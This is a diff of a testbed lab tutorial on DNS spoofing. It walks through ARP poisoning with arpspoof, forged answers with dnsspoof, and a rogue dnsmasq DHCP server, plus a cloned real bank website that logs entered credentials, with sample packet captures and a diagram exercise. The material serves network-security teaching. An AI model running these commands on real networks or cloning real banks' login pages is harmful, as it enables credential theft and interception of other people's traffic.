@@ -25,6 +25,7 @@ There are many different ways to do DNS spoofing. In this experiment we'll try t
 1. acting as a false DHCP server and lying to clients on the LAN about which DNS server to use, and 
 2. mounting a man-in-the-middle attack and impersonating the real DNS server.
 
+(For more information about DNS and DHCP services, see the experiment [Basic home gateway services: DHCP, DNS, NAT](https://witestlab.poly.edu/blog/basic-home-gateway-services-dhcp-dns-nat/).)
 
 DNS spoofing is easiest when both the attacker and victim are on the same LAN. However, there are other (less reliable) DNS attacks that can feasibly be carried out even without access to the victim's LAN.
 
@@ -50,13 +51,13 @@ Finally, we see how this attack can be used to transparently capture a user's lo
 
 ## Run my experiment
 
-First, reserve your resources. This experiment involves resources on two separate InstaGENI sites, which you will reserve using [two different RSpecs](https://gist.github.com/ffund/5751e9bb35dd93a4531e70947fefc5d3).
+First, reserve your resources. This experiment involves resources on two separate InstaGENI sites, which you will reserve using [two different RSpecs](https://gist.github.com/ffund/5751e9bb35dd93a4531e70947fefc5d3). (Note: you will need one publicly routable IP on each InstaGENI site. If you are having trouble getting resources, you may use [this monitoring page](https://genimon.uky.edu/status) to find sites with publicly routable IPs available.)
 
-In the GENI Portal, create a new slice, then click "Add Resources". Load the RSpec from the URL: [https://git.io/vShxD](https://git.io/vShxD)
+In the GENI Portal, create a new slice, then click "Add Resources". Load the RSpec from the URL: [https://git.io/vShxH](https://git.io/vShxH)
 
 This should load a topology onto your canvas, with a client, a "good" network gateway implementing DHCP and DNS services, and a malicious attacker on the same LAN. The RSpec also includes commands to install the necessary software (e.g. `dnsmasq` for DNS and DHCP service, an Apache web server, the `dsniff` package for ARP and DNS spoofing, etc.) on the nodes. Click on "Site 1" and choose an InstaGENI site to bind to, then reserve your resources. 
 
-Then, you will reserve a node on another InstaGENI site that will be the "malicious" banking website. In the same slice, click "Add Resources", and load the RSpec from the URL: [https://git.io/vShxH](https://git.io/vShxH)
+Then, you will reserve a node on another InstaGENI site that will be the "malicious" banking website. In the same slice, click "Add Resources", and load the RSpec from the URL: [https://git.io/vShxD](https://git.io/vShxD)
 
 Click on "Site 1" and  choose a _different_ InstaGENI site to bind to, then reserve your resources.
 
@@ -70,7 +71,7 @@ Then, wait another couple of minutes for the software installation to finish. Fi
 
 Your "bank" node has been set up with a publicly routable IP address, so that sites hosted on it can be reached from anywhere on the Internet. It will also have a basic web server stack installed on it already.
 
-To set it up, you will download the content of a banking website onto your new web server. You can choose between [Diamond Bank](http://diamondbanking.com) of Arkansas _or_ [Bank of Hamilton](http://bankofhamilton.com), North Dakota. (Choose only _one_ of the two sites.) Both of these sites are vulnerable to impersonation because they do not use [HTTPS](https://en.wikipedia.org/wiki/HTTPS) (HTTP with an SSL or TLS layer). With HTTPS, the server would have a certificate that is signed by a [Certificate Authority](https://en.wikipedia.org/wiki/Certificate_authority) (CA) that authenticates it, i.e. confirms that the site _is_ who it claims to be.
+To set it up, you will download the content of a banking website onto your new web server. You can choose between [Diamond Bank](http://diamondbanking.com) of Arkansas _or_ [Bank of Hamilton](http://bankofhamilton.com), North Dakota. (Choose only _one_ of the two sites.) Why these sites? Both of these sites are vulnerable to impersonation because they do not use [HTTPS](https://en.wikipedia.org/wiki/HTTPS) (HTTP with an SSL or TLS layer). With HTTPS, the server would have a certificate that is signed by a [Certificate Authority](https://en.wikipedia.org/wiki/Certificate_authority) (CA) that authenticates it, i.e. confirms that the site _is_ who it claims to be.
 
 [Modern browsers](https://arstechnica.com/information-technology/2017/01/firefox-chrome-start-calling-http-connections-insecure/) usually identify sites that accept login details on an HTTP page in the address bar, e.g. Chrome shows these sites as "Not Secure":
 
@@ -227,7 +228,24 @@ dhclient eth1
 
 to request an IP address from DHCP over the private LAN. 
 
-In the server terminal windows, you should see the DHCP request and response in both the `dnsmasq` and `tcpdump` windows. Note that the DHCP request is not directed at any particular server; it is sent to the broadcast address. This is what will enable our attacker to hijack DHCP on the LAN in the next steps of our experiment!
+In the server terminal windows, you should see the DHCP request and response in the `dnsmasq` and `tcpdump` windows, e.g.:
+
+```
+dnsmasq-dhcp: DHCPDISCOVER(eth1) 02:0f:07:a6:c6:d8 
+dnsmasq-dhcp: DHCPOFFER(eth1) 10.10.1.37 02:0f:07:a6:c6:d8 
+dnsmasq-dhcp: DHCPREQUEST(eth1) 10.10.1.37 02:0f:07:a6:c6:d8 
+dnsmasq-dhcp: DHCPACK(eth1) 10.10.1.37 02:0f:07:a6:c6:d8 client
+```
+and
+
+```
+14:10:08.933742 IP 0.0.0.0.68 > 255.255.255.255.67: BOOTP/DHCP, Request from 02:0f:07:a6:c6:d8, length 300
+14:10:11.187832 IP 10.10.1.2.67 > 10.10.1.37.68: BOOTP/DHCP, Reply, length 300
+14:10:11.188885 IP 0.0.0.0.68 > 255.255.255.255.67: BOOTP/DHCP, Request from 02:0f:07:a6:c6:d8, length 300
+14:10:11.240854 IP 10.10.1.2.67 > 10.10.1.37.68: BOOTP/DHCP, Reply, length 300
+```
+
+Note that the DHCP request is not directed at any particular server; it is sent to the broadcast address. This is what will enable our attacker to hijack DHCP on the LAN in later steps of our experiment!
 
 Now, we'll verify that the client is using our "good" server for name resolution. First, we'll test using the `nslookup` name resolution tool. On the client, run:
 
@@ -235,7 +253,24 @@ Now, we'll verify that the client is using our "good" server for name resolution
 nslookup bankofhamilton.com
 ```
 
-In the `tcpdump` output on the server, you should see the DNS query and response.
+You should see the _real_ IP address of the website in the response:
+
+```
+nslookup bankofhamilton.com  
+Server:		10.10.1.2
+Address:   	10.10.1.2#53
+
+Non-authoritative answer:
+Name:	bankofhamilton.com
+Address: 66.55.106.88
+```
+
+In the `tcpdump` output on the server, you should also see the DNS query and response:
+
+```
+14:10:20.728273 IP 10.10.1.21.56094 > 10.10.1.2.53: 28276+ A? bankofhamilton.com. (36)
+14:10:20.931615 IP 10.10.1.2.53 > 10.10.1.21.56094: 28276 1/4/4 A 66.55.106.88 (198)
+```
 
 Finally, we'll visit `bankofhamilton.com` using the browser window that is running _on our client_, and verify that name lookup again. Again, you should see the name lookup in the `tcpdump` output on the server. (You may also see lookups for additional assets - images and scripts - that are hosted on other domains.)
 
@@ -259,11 +294,19 @@ to become the "root" user on these as well.
 This attack works most reliably when packets from the attacker reach the client _before_ packets from the "good" server. To ensure this happens in our experiment, we will set up some extra latency on the "good" server. Stop the `tcpdump` process on the "good" server temporarily, and run
 
 ```
-tc qdisc del dev eth1 root
+tc qdisc del dev eth1 root 
+# don't worry if this command returns 
+# 'RTNETLINK answers: No such file or directory'
 tc qdisc add dev eth1 root netem delay 500ms 2ms distribution normal
 ```
 
-on it.  Then restart the `tcpdump`.
+on it.  Then restart the `tcpdump` with 
+
+```
+tcpdump -i eth1 -n -e "udp port 53"
+```
+
+Here, we specifically look at DNS traffic (using UDP port 53), and we also look at the Ethernet headers.
 
 (This procedure assumes that you have just completed the steps above, so that the client uses the "good" server for both DHCP and DNS lookups, and that the `dnsmasq` process is currently running on the "good" server. If you haven't gone through those steps yet, do them now.)
 
@@ -274,6 +317,12 @@ Check the client's ARP table to see what MAC address is currently associated wit
 arp -a -i eth1
 ```
 
+You should see the "good" server's actual MAC address, e.g. in my experiment:
+
+```
+dns-good-link-0 (10.10.1.2) at 02:b7:c8:cf:b7:ce [ether] on eth1
+```
+
 Next, we are going to use ARP spoofing to make the client believe we are the "good" server, and the server believe we are the client. On the attacker, run:
 
 
@@ -282,11 +331,17 @@ Next, we are going to use ARP spoofing to make the client believe we are the "go
 sysctl -w net.ipv4.ip_forward=1
 # get IP address of client from the "good" server
 clientip=$(dig @10.10.1.2 +short client)
-# two-way ARP spoofing: make client think we are
-# the "good" server, make "good" server think we 
-# are the client
-arpspoof -i eth1 -t "$clientip" 10.10.1.2 &
+# ARP spoofing: make client think we are
+# the "good" server, and vice versa
 arpspoof -i eth1 -t 10.10.1.2 "$clientip" &
+arpspoof -i eth1 -t "$clientip" 10.10.1.2 &
+```
+
+In the terminal output, you can see that the attacker sends ARPs to the client impersonating the "good" DNS server (which is at 10.10.1.2), and also sends ARPs to the "good" server impersonating the client:
+
+```
+2:60:70:39:bf:e2 2:b7:c8:cf:b7:ce 0806 42: arp reply 10.10.1.37 is-at 2:60:70:39:bf:e2
+2:60:70:39:bf:e2 2:f:7:a6:c6:d8 0806 42: arp reply 10.10.1.2 is-at 2:60:70:39:bf:e2
 ```
 
 On the client node, check the ARP table again with
@@ -297,15 +352,19 @@ arp -a -i eth1
 
 You should see that what the client now believes that the "good" server's MAC address is actually the attackers' MAC address!
 
+```
+dns-good-link-0 (10.10.1.2) at 02:60:70:39:bf:e2 [ether] on eth1
+```
+
 Finally, we're ready to offer up some bad name resolution. In a second terminal on the attacker, run
 
 <pre>
-echo "<b>198.248.248.125</b> bankofhamilton.com" > /tmp/badhosts
+echo "<b>66.104.96.102</b> bankofhamilton.com" > /tmp/badhosts
 
 dnsspoof -i eth1 -f /tmp/badhosts
 </pre>
 
-substituting the public IP address for the "bank" node that you found in a [previous step](#setupthefakewebsite).
+substituting for the part in bold the public IP address for the "bank" node that you found in a [previous step](#setupthefakewebsite).
 
 This command creates a file called `badhosts` with a list of IP address and hostname mappings that we will fool our client into believing. In this case, our attacker will make the client go to our imposter site when he tries to visit Bank of Hamilton. Then we use the `dnsspoof` tool to answer DNS queries for those hosts.
 
@@ -316,7 +375,47 @@ On the client, run
 nslookup bankofhamilton.com
 ```
 
-In the `tcpdump` output on the "good" server, you should still see the DNS query and response. But you should also see a query and response in the `dnsspoof` output on the attacker. Check the IP address returned from `nslookup`  - is it the same one as before?
+
+Check the IP address returned from `nslookup`  - is it the same one as before? 
+
+<pre>
+Server:		10.10.1.2
+Address:	   10.10.1.2#53
+
+Non-authoritative answer:
+Name:	bankofhamilton.com
+Address: <b>66.104.96.102</b>
+</pre>
+
+Also note that the client _believes_ it has received a response from the "good" server (at 10.10.1.2), even though this actually came from the attacker.
+
+In the `tcpdump` output on the "good" server, you should still see the DNS query and response. First, we see that the client (02:0f:07:a6:c6:d8 in this example) sends a DNS query for bankofhamilton.com to the address of the good server, 10.10.1.2, but using the attacker's MAC address (02:60:70:39:bf:e2) as the destination:
+
+```
+15:01:22.684782 02:0f:07:a6:c6:d8 > 02:60:70:39:bf:e2, ethertype IPv4 (0x0800), length 78: 10.10.1.37.36285 > 10.10.1.2.53: 36777+ A? bankofhamilton.com. (36)
+```
+
+The attacker sends a query to the "good" server (on 02:b7:c8:cf:b7:ce in this example) pretending to be the client at 10.10.1.37, and finds out the actual IP address associated with that hostname. (In the event that the hostname requested  by the client is not on the list of IP addresses it will "spoof", it still needs to return an address - which it will learn from this legitimate DNS lookup.)
+
+```
+15:01:22.684815 02:60:70:39:bf:e2 > 02:b7:c8:cf:b7:ce, ethertype IPv4 (0x0800), length 78: 10.10.1.37.36285 > 10.10.1.2.53: 36777+ A? bankofhamilton.com. (36)
+```
+
+The attacker (02:60:70:39:bf:e2) sends a response to the client (02:0f:07:a6:c6:d8) claiming that the Bank of Hamilton site is at 66.104.96.102, which is the IP address of the "fake" site:
+
+```
+15:01:22.726897 02:60:70:39:bf:e2 > 02:0f:07:a6:c6:d8, ethertype IPv4 (0x0800), length 94: 10.10.1.2.53 > 10.10.1.37.36285: 36777 1/0/0 A 66.104.96.102 (52)
+15:01:22.726934 02:60:70:39:bf:e2 > 02:0f:07:a6:c6:d8, ethertype IPv4 (0x0800), length 94: 10.10.1.2.53 > 10.10.1.37.36285: 36777 1/0/0 A 66.104.96.102 (52)
+```
+
+Meanwhile, the "good" DNS server sent the actual address of the Bank of Hamilton site to the attacker's MAC address, and it passes this along to the client. However, the client has already received a (wrong) IP address and won't use this one:
+
+
+```
+15:10:38.891177 02:b7:c8:cf:b7:ce > 02:60:70:39:bf:e2, ethertype IPv4 (0x0800), length 94: 10.10.1.2.53 > 10.10.1.37.59853: 26445 1/0/0 A 66.55.106.88 (52)
+15:10:38.891215 02:60:70:39:bf:e2 > 02:0f:07:a6:c6:d8, ethertype IPv4 (0x0800), length 94: 10.10.1.2.53 > 10.10.1.37.59853: 26445 1/0/0 A 66.55.106.88 (52)
+```
+
 
 Finally, we'll visit `bankofhamilton.com` in the Firefox browser instance that is running on our client, and verify that it takes us to the imposter site instead of the real thing. We have modified the logo of the imposter site with a big "FAKE" warning so that we can tell which site we are visiting.
 
@@ -343,7 +442,13 @@ tc qdisc del dev eth1 root
 tc qdisc add dev eth1 root netem delay 500ms 2ms distribution normal
 ```
 
-and then you can start the `tcpdump` again. Also, the `dnsmasq` process should still be running on the "good" server.
+and then you can start the `tcpdump` again. We will use a filter to focus on DHCP traffic:
+
+```
+tcpdump -i eth1 -n -e -v "udp port 67 or udp port 68"
+```
+
+Also, the `dnsmasq` process should still be running on the "good" server.
 
 Now, on the attacker, start a `dnsmasq` instance:
 
@@ -352,10 +457,10 @@ service dnsmasq stop
 dnsmasq --interface=eth1 --dhcp-range=10.10.1.20,10.10.1.50,255.255.255.0,72h --no-hosts --dhcp-option=6,10.10.1.254 --addn-hosts=/tmp/badhosts -d
 ```
 
-Note the `addn-hosts` option we are using, to tell `dnsmasq` to respond to queries for hostnames listed in the `badhosts` file with the corresponding addresses listed there. Also on the attacker, start a `tcpdump`:
+Note the `addn-hosts` option we are using, to tell `dnsmasq` to respond to queries for hostnames listed in the `badhosts` file with the corresponding addresses listed there. Also on the attacker, start a `tcpdump` to show DHCP traffic:
 
 ```
-tcpdump -n -i eth1 "ip"
+tcpdump -i eth1 -n -e -v "udp port 67 or udp port 68"
 ```
 
 Now, on the client node, run
@@ -376,7 +481,91 @@ and
 dhclient eth1  
 ```
 
-to ask for an IP address from DHCP over the private LAN. You should see offers from both `dnsmasq` instances - on the "good" server and on the attacker - in the terminal output. But only one server will then get a request from the client. On the client, check the actual IP now used with
+to ask for an IP address from DHCP over the private LAN. In the `tcpdump` output, we can see the client's DISCOVER message, which is broadcast on the LAN:
+
+<pre>
+15:20:14.312030 02:0f:07:a6:c6:d8 > <b>ff:ff:ff:ff:ff:ff</b>, ethertype IPv4 (0x0800), length 342: (tos 0x10, ttl 128, id 0, offset 0, flags [none], proto UDP (17), length 328)
+    0.0.0.0.68 > <b>255.255.255.255</b>.67: BOOTP/DHCP, Request from 02:0f:07:a6:c6:d8, length 300, xid 0xb9ac4669, Flags [none]
+      Client-Ethernet-Address 02:0f:07:a6:c6:d8
+      Vendor-rfc1048 Extensions
+        Magic Cookie 0x63825363
+        DHCP-Message Option 53, length 1: <b>Discover</b>
+        Requested-IP Option 50, length 4: 10.10.1.37
+        Hostname Option 12, length 6: "client"
+        Parameter-Request Option 55, length 7: 
+          Subnet-Mask, BR, Time-Zone, Default-Gateway
+          Domain-Name, Domain-Name-Server, Option 119
+</pre>
+
+You should see OFFER messages from both `dnsmasq` instances - on the "good" server and on the attacker - in the `tcpdump` captures. But only one server will then get a REQUEST from the client. Since the offer from the "good" server is delayed, the client will complete the DHCP transaction with the attacker, which responded to the query first:
+
+<pre>
+15:20:14.312280 02:60:70:39:bf:e2 > 02:0f:07:a6:c6:d8, ethertype IPv4 (0x0800), length 342: (tos 0xc0, ttl 64, id 47099, offset 0, flags [none], proto UDP (17), length 328)
+    10.10.1.254.67 > 10.10.1.37.68: BOOTP/DHCP, Reply, length 300, xid 0xb9ac4669, Flags [none]
+      Your-IP 10.10.1.37
+      Server-IP <b>10.10.1.254</b>
+      Client-Ethernet-Address 02:0f:07:a6:c6:d8
+      Vendor-rfc1048 Extensions
+        Magic Cookie 0x63825363
+        DHCP-Message Option 53, length 1: <b>Offer</b>
+        Server-ID Option 54, length 4: 10.10.1.254
+        Lease-Time Option 51, length 4: 259200
+        RN Option 58, length 4: 129600
+        RB Option 59, length 4: 226800
+        Subnet-Mask Option 1, length 4: 255.255.255.0
+        BR Option 28, length 4: 10.10.1.255
+        Default-Gateway Option 3, length 4: 10.10.1.254
+        Domain-Name-Server Option 6, length 4: 10.10.1.254
+
+15:20:14.313701 02:0f:07:a6:c6:d8 > ff:ff:ff:ff:ff:ff, ethertype IPv4 (0x0800), length 342: (tos 0x10, ttl 128, id 0, offset 0, flags [none], proto UDP (17), length 328)
+    0.0.0.0.68 > 255.255.255.255.67: BOOTP/DHCP, Request from 02:0f:07:a6:c6:d8, length 300, xid 0xb9ac4669, Flags [none]
+      Client-Ethernet-Address 02:0f:07:a6:c6:d8
+      Vendor-rfc1048 Extensions
+        Magic Cookie 0x63825363
+        DHCP-Message Option 53, length 1: <b>Request</b>
+        Server-ID Option 54, length 4: <b>10.10.1.254</b>
+        Requested-IP Option 50, length 4: 10.10.1.37
+        Hostname Option 12, length 6: "client"
+        Parameter-Request Option 55, length 7: 
+          Subnet-Mask, BR, Time-Zone, Default-Gateway
+          Domain-Name, Domain-Name-Server, Option 119
+
+15:20:14.349626 02:60:70:39:bf:e2 > 02:0f:07:a6:c6:d8, ethertype IPv4 (0x0800), length 342: (tos 0xc0, ttl 64, id 47100, offset 0, flags [none], proto UDP (17), length 328)
+    10.10.1.254.67 > 10.10.1.37.68: BOOTP/DHCP, Reply, length 300, xid 0xb9ac4669, Flags [none]
+      Your-IP 10.10.1.37
+      Server-IP <b>10.10.1.254</b>
+      Client-Ethernet-Address 02:0f:07:a6:c6:d8
+      Vendor-rfc1048 Extensions
+        Magic Cookie 0x63825363
+        DHCP-Message Option 53, length 1: <b>ACK</b>
+        Server-ID Option 54, length 4: 10.10.1.254
+        Lease-Time Option 51, length 4: 259200
+        RN Option 58, length 4: 129600
+        RB Option 59, length 4: 226800
+        Subnet-Mask Option 1, length 4: 255.255.255.0
+        BR Option 28, length 4: 10.10.1.255
+        Default-Gateway Option 3, length 4: 10.10.1.254
+        Domain-Name-Server Option 6, length 4: 10.10.1.254
+
+15:20:14.813171 02:b7:c8:cf:b7:ce > 02:0f:07:a6:c6:d8, ethertype IPv4 (0x0800), length 342: (tos 0xc0, ttl 64, id 24262, offset 0, flags [none], proto UDP (17), length 328)
+    10.10.1.2.67 > 10.10.1.37.68: BOOTP/DHCP, Reply, length 300, xid 0xb9ac4669, Flags [none]
+      Your-IP 10.10.1.37
+      Server-IP <b>10.10.1.2</b>
+      Client-Ethernet-Address 02:0f:07:a6:c6:d8
+      Vendor-rfc1048 Extensions
+        Magic Cookie 0x63825363
+        DHCP-Message Option 53, length 1: <b>Offer</b>
+        Server-ID Option 54, length 4: 10.10.1.2
+        Lease-Time Option 51, length 4: 259200
+        RN Option 58, length 4: 129600
+        RB Option 59, length 4: 226800
+        Subnet-Mask Option 1, length 4: 255.255.255.0
+        BR Option 28, length 4: 10.10.1.255
+        Default-Gateway Option 3, length 4: 10.10.1.2
+        Domain-Name-Server Option 6, length 4: 10.10.1.2
+</pre>
+
+On the client, check the actual IP now used with
 
 ```
 ifconfig eth1
@@ -390,19 +579,40 @@ cat /etc/resolv.conf
 
 to check which host it is using for name resolution. Is it the "good" server (10.10.1.2) or the attacker (10.10.1.254)?
 
-Try resolving bankofhamilton.com on the client with 
+On both the attacker and the good server, stop the currently running `tcpdump` and start a new one to focus on DNS traffic:
+
+```
+tcpdump -i eth1 -n "udp port 53"
+```
+
+Then, try resolving bankofhamilton.com on the client with 
 
 ```
 nslookup bankofhamilton.com
 ```
 
-Do you see the DNS traffic on the "good" server or the attacker. 
+We can see in the output that the client has queried the attacker, not the good server:
 
-Also try visiting it in the browser that is running on the client, at bankofhamilton.com.
+<pre>
+Server:		<b>10.10.1.254</b>
+Address:	   10.10.1.254#53
+
+Name:	bankofhamilton.com
+Address: <b>66.104.96.102</b>
+</pre>
+
+and this is also confirmed in the `tcpdump` output:
+
+<pre>
+15:29:58.416876 IP 10.10.1.37.55261 > <b>10.10.1.254</b>.53: 56438+ A? bankofhamilton.com. (36)
+15:29:58.417019 IP <b>10.10.1.254</b>.53 > 10.10.1.37.55261: 56438* 1/0/0 A <b>66.104.96.102</b> (52)
+</pre>
+
+Also try visiting this site in the browser that is running on the client.
 
 <iframe width="560" height="315" src="https://www.youtube.com/embed/ZirXGPQQieE" frameborder="0" allowfullscreen></iframe>
 
-This attack is not deterministic - if the "good" server's DHCP offer reaches the client before the attacker's, then it won't work. You may need to repeat this experiment a couple of times in order to see it in effect.
+This attack is not deterministic - if the "good" server's DHCP offer reaches the client before the attacker's, then it won't work. (We added some delay on the "good" server to increase the probability that it will be too late to offer an address, but of course a "real" attacker would not have that ability.) You may need to repeat this experiment a couple of times in order to see it in effect.
 
 ### Capture login credentials
 
@@ -414,7 +624,7 @@ sudo tail -f /var/log/apache2/error.log
 
 to watch the web server error log. We have set up our site to log all captured credentials to this file.
 
-In the Firefox window that is running on the "client" node, attempt to log in to the Bank of Hamilton imposter site.
+In the Firefox window that is running on the "client" node, attempt to log in to the Bank of Hamilton imposter site (with any username and password; it won't work, of course).
 
 Then, return to the "bank" terminal window. You should observe that the username and password you entered are recorded in the log file:
 
@@ -430,7 +640,32 @@ Meanwhile, in the browser, the user has been redirected to the regular (secure) 
 
 ### Delete your resources
 
-When you have finished this experiment, delete your resources in the Portal to free them for other experimenters!
+When you have finished this experiment, delete your resources in the Portal to free them for other experimenters.
 
 ## Notes
 
+### Exercise
+
+The following [diagram](https://docs.google.com/drawings/d/1gKX_f48Vgbjg-ZphihyGJIvExNHD5k8TNCdvk3yExJQ/edit?usp=sharing) shows the exchange of packets (in chronological order) between the client, the "good" server, and the attacker, for a [normal](##normaldnsqueries) DHCP transaction and DNS query/response:
+
+![](/blog/content/images/2017/04/dnsspoof-good-diagram-1.svg)
+
+Using the results of your own experiment, create three diagrams similar to the one above, one for each of the scenarios:
+
+1. Normal DHCP and DNS resolution of the bank's hostname.
+2. DNS spoofing attack with ARP spoofing.
+3. DNS spoofing attack with DHCP masquerade.
+
+In each diagram, show the relevant details of the ARP, DNS, and DHCP messages that you observed in your experiment for that scenario. Also, 
+
+* Label the client, "good" server, and attacker with their (real) MAC addresses.
+* Show broadcast packets arriving at all other hosts in the LAN (except the sender).
+* For the ARP spoofing experiment, you need only show one example of _each_ ARP (you don't have to show repeated identical ARPs).
+* The diagram above shows what relevant information to include for DNS and DHCP packets. Here is a template you can use for ARP messages:
+
+<pre>
+<b>ARP</b>: 10.10.1.2 is at 02:60:70:39:bf:e2
+02:60:70:39:bf:e2 > 02:0f:07:a6:c6:d8
+</pre>
+
+After each diagram, include the terminal output in which you observe the packets shown in the diagram. Make sure to label which host the output comes from. **Don't** just dump everything you see into your report - include only the relevant parts of your output, and highlight the important details.
